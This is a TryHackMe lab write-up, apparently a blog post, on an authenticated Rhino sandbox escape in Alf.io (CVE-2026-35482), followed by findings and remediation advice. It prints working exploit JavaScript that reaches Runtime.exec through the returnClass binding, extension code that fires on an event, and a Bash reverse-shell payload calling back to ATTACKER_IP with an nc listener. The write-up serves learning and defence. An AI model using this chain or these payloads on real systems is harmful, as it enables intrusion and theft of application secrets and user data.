---
title: "TryHackMe: NoScope: Finding RCE"
date: 2026-07-04 23:40:00 +0200
categories: [TryHackMe]
tags:
  - web
  - java
  - rhino
  - sandbox-escape
  - rce
  - cve-2026-35482
  - alfio
description: >-
  NoScope: Finding RCE demonstrated an authenticated sandbox escape in Alf.io's
  Mozilla Rhino extension engine, where an exposed returnClass binding enabled
  reflective access to java.lang.Runtime and arbitrary OS command execution.
author: lenovolegion7
media_subpath: /images/tryhackme_noscope_finding_rce
image:
  path: room_image.webp
  alt: "Original TryHackMe NoScope Finding RCE room artwork"
toc: true
comments: false
---

NoScope: Finding RCE focuses on an authenticated remote code execution flaw in Alf.io's server-side extension system. The target's JavaScript validator blocked obvious access to dangerous Java classes, but the Rhino execution scope exposed a live `java.lang.Class` object through `returnClass`. That object provided an unexpected path to `Class.forName()`, Java reflection, and ultimately `Runtime.exec()`.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe NoScope Finding RCE room card](room_card.webp){: w="302" h="272" .shadow }](https://tryhackme.com/room/noscoperce){: .center }

## Initial Enumeration

Network discovery identified SSH and the Alf.io web application:

```console
$ nmap -Pn -sC -sV -T4 TARGET_IP
22/tcp open  ssh   OpenSSH
80/tcp open  http  Alf.io
```

The administrative application was available under:

```text
http://TARGET_IP/admin
```

Administrator credentials were supplied by the room for the authenticated assessment:

```text
username: admin
password: [REDACTED]
```

The tested deployment exposed Alf.io's extension-management functionality, which allows trusted administrators to register server-side JavaScript that executes in response to application events.

## Validated Attack Path

1. **Service discovery** — identified SSH and the Alf.io HTTP application.
2. **Authenticated access** — logged into the Alf.io administrator interface with room-provided credentials.
3. **Extension-sandbox review** — confirmed that direct dangerous Java access was blocked by a deny-list validator.
4. **Sandbox escape** — used the live `returnClass` binding to load `java.lang.Runtime` through `Class.forName()`.
5. **Command execution** — reflection reached `Runtime.getRuntime().exec()` and executed OS commands as the Alf.io process user.
6. **Event trigger** — registered a malicious extension bound to `EVENT_STATUS_CHANGE` and triggered it through the application workflow.
7. **Reverse shell** — the extension downloaded and launched a controlled reverse-shell script.
8. **Objective validation** — the resulting shell accessed `/etc/flag.txt`, returning `THM{[REDACTED]}`.

> **Result:** Authenticated administrator access was converted into arbitrary OS command execution through a Rhino sandbox escape.
{: .prompt-danger }

## Technical Background

Alf.io executes administrator-supplied JavaScript through Mozilla Rhino. The target attempted to constrain this feature with a validator that rejected obvious dangerous syntax and direct use of sensitive Java APIs.

The key security boundary failure was an object injected into the script scope:

```text
returnClass
```

The object was a live Java `Class` instance. Although the normal Java interop facade restricted arbitrary class access, `returnClass` still exposed `Class.forName(String)`.

That enabled a script to resolve arbitrary JVM classes by name:

```javascript
var rtClass = returnClass.forName('java.lang.Runtime');
var strClass = returnClass.forName('java.lang.String');
```

Reflection could then invoke `getRuntime()` and `exec()`:

```javascript
var runtime = rtClass
  .getMethod('getRuntime')
  .invoke(null);

rtClass
  .getMethod('exec', strClass)
  .invoke(runtime, 'id');
```

This was the validated primitive. An alternative `Java.type('java.lang.Runtime')` approach was not the reliable path because the application's Java interop facade was restricted.

## Extension Registration and Trigger

The malicious extension used event metadata so that code would execute when an application status-change event occurred:

```javascript
function getScriptMetadata() {
  return {
    id: 'rce-rev',
    displayName: 'RCE Reverse Shell',
    version: 0,
    async: false,
    events: ['EVENT_STATUS_CHANGE']
  };
}
```

The execution body used `returnClass.forName()` to reach `java.lang.Runtime` and launch commands:

```javascript
function executeScript(scriptEvent) {
  var rtClass = returnClass.forName('java.lang.Runtime');
  var strClass = returnClass.forName('java.lang.String');
  var runtime = rtClass.getMethod('getRuntime').invoke(null);

  rtClass
    .getMethod('exec', strClass)
    .invoke(runtime, 'id');

  return { invoiceNumber: 'triggered' };
}
```

The extension passed the validator because the control matched known dangerous syntax rather than modelling the capabilities of objects already exposed to the script.

## Reverse Shell Validation

A controlled Bash payload was hosted from the attack system:

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
```

The attack host provided the file over HTTP and waited for the callback:

```console
$ python3 -m http.server 8000
$ rlwrap -cAr nc -lvnp 4444
```

The extension then used `Runtime.exec()` to retrieve and execute the script. After the `EVENT_STATUS_CHANGE` trigger fired, the target connected back to the listener.

The shell ran as the Alf.io application user:

```console
$ whoami
alfio

$ pwd
/home/alfio/app
```

No privilege escalation was required for the room objective because the compromised application context could read the target flag:

```console
$ cat /etc/flag.txt
THM{[REDACTED]}
```

## Findings

### F-01 — Authenticated RCE via Extension Sandbox Escape

- **Severity:** Critical
- **CVE:** CVE-2026-35482
- **Affected component:** Alf.io extension system / Mozilla Rhino sandbox
- **Prerequisite:** Authenticated administrator access

The extension runtime exposed a Java `Class` object through `returnClass`. Because the deny-list validator did not account for the reflective capabilities of that object, a script could load `java.lang.Runtime` and execute operating-system commands.

**Impact:**

- arbitrary command execution as the Alf.io process user;
- access to files and secrets readable by the application;
- access to application and database credentials;
- potential reachability of backend services from the application network context;
- durable code execution if a malicious extension remains bound to routine events.

**Remediation:**

- upgrade Alf.io to a patched version;
- remove or strictly constrain the `returnClass` binding;
- replace deny-list validation with a deny-by-default Rhino `ClassShutter`;
- expose only narrowly audited Java APIs to scripts;
- run extensions inside an additional OS-level sandbox with minimal filesystem and process privileges.

### F-02 — Blocklist Validation Failed to Enforce Sandbox Boundaries

**Severity:** High

The validator rejected known dangerous syntax but did not model the capabilities of objects placed into the execution scope. Equivalent functionality therefore remained reachable through `returnClass.forName()` and reflection.

**Remediation:**

- use allow-list security boundaries rather than string or AST blocklists;
- audit every object injected into the script scope;
- add regression tests for `Class.forName`, reflection, `Runtime`, `ProcessBuilder`, constructors, and prototype-based bypasses;
- fail closed when a script attempts Java class loading or reflective invocation outside the supported API.

### F-03 — Event-Triggered Extensions Provide Durable Execution

**Severity:** Medium

Extensions can bind to routine business events. A malicious script that remains enabled can therefore execute again whenever the configured event occurs.

**Impact:** A one-time sandbox escape can become a recurring execution mechanism.

**Remediation:**

- review and approve all extensions before enabling them;
- log extension creation, modification, and execution;
- require trusted source control or code signing for production extension code;
- alert on network utilities and child processes spawned from the Java application.

## Security Impact

The demonstrated vulnerability turned trusted administrator functionality into host-level code execution. In a production deployment, compromise of the Alf.io process could expose application secrets, database credentials, attendee information, payment-related data, and any internal services reachable from the application environment.

The underlying problem was broader than a single blocked token. The execution model treated a scripting sandbox as safe while simultaneously exposing an object capable of arbitrary class loading. Once the attacker could reach reflection, the deny-list ceased to be an effective security boundary.

## Remediation Priorities

1. Upgrade to the patched Alf.io release addressing CVE-2026-35482.
2. Disable or restrict extension creation until the update is deployed.
3. Remove `returnClass` and any comparable reflective bindings from script scope.
4. Replace blocklist validation with a strict Rhino `ClassShutter` allow-list.
5. Remove untrusted or unexpected extensions and review existing extension code.
6. Rotate secrets accessible to the Alf.io process.
7. Restrict administrative access using VPN, SSO, MFA, and least privilege.
8. Limit outbound network access from the Alf.io runtime.
9. Alert on suspicious Java child processes, shell execution, and extension-trigger activity.

## Cleanup Considerations

The supplied assessment evidence confirms the malicious extension and reverse-shell workflow but does not provide a complete cleanup transcript. A production engagement should explicitly:

- delete the malicious extension;
- remove any downloaded reverse-shell scripts;
- terminate attack listeners and sessions;
- rotate application secrets that may have been exposed;
- review extension execution logs and outbound connections;
- verify that no unauthorized event-triggered extensions remain.

## Lessons Learned

Sandbox security must be capability-based. Blocking strings such as `Runtime`, `getClass`, or reflection keywords cannot provide a robust boundary if an exposed object can recreate the same capabilities indirectly.

This room also highlights the value of source-assisted validation. An initially promising Java interop path was shown to be restricted, while source review revealed the actual vulnerable primitive: the unrestricted `returnClass` binding. Validating exploitability against the real execution model prevented a false positive and produced a reliable proof of remote code execution.
